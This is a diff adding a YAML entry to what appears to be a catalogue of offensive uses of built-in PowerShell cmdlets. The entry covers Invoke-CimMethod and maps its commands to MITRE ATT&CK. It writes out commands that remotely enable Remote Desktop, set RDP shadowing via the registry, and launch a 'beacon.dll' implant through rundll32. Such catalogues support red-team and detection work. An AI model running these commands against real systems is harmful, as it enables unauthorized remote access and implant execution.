@@ -1,0 +1,43 @@
+---
+Name: Invoke-CimMethod
+Description: Invokes a method of a CIM class
+Updated: 2023-07-01
+Toolsets:
+  - Builtin
+  - CIMSession
+Commands:
+  - Command: Get-CimInstance -Namespace root/CIMV2/TerminalServices -ClassName Win32_TerminalServiceSetting | Invoke-CimMethod -MethodName SetAllowTSConnections -Arguments @{AllowTSConnections=1; ModifyFirewallException=1}
+    Description: Invoke a method on a CIM instance
+    Usecases:
+      - Enable Remote Desktop Services
+    Function: Manage
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'PowerShell Module: `CimCmdlets`'
+    MitreAttack:
+      - T1047
+  - Command: 'Invoke-CimMethod -ClassName StdRegProv -MethodName SetDWORDValue -Arguments @{hDefKey=[uint32]2147483650; sSubKeyName="Software\Policies\Microsoft\Windows NT\Terminal Services"; sValueName="Shadow"; uValue=[uint32]2} -CimSession $s'
+    Description: Invoke a static method on a CIM class
+    Usecases:
+      - Set registry value
+    Function: Registry
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'PowerShell Module: `CimCmdlets`'
+    MitreAttack:
+      - T1112
+  - Command: 'Invoke-CimMethod -ClassName Win32_Process -Name Create -Arguments @{CommandLine=''C:\Windows\System32\rundll32.exe "C:\tmp\App Folder\beacon.dll",Start''} -CimSession $s'
+    Description: Invoke a static method on a CIM class
+    Usecases:
+      - Launch implant
+    Function: Execute
+    Comments:
+      - 'Create CimSession `$s` using [New-CimSession](../../Cmdlets/New-CimSession/)'
+      - 'PowerShell Module: `CimCmdlets`'
+    MitreAttack:
+      - T1047
+Resources:
+Detections:
+Contributors:
+    - Name: Arris Huijgen
+      Handle: bitsadmin
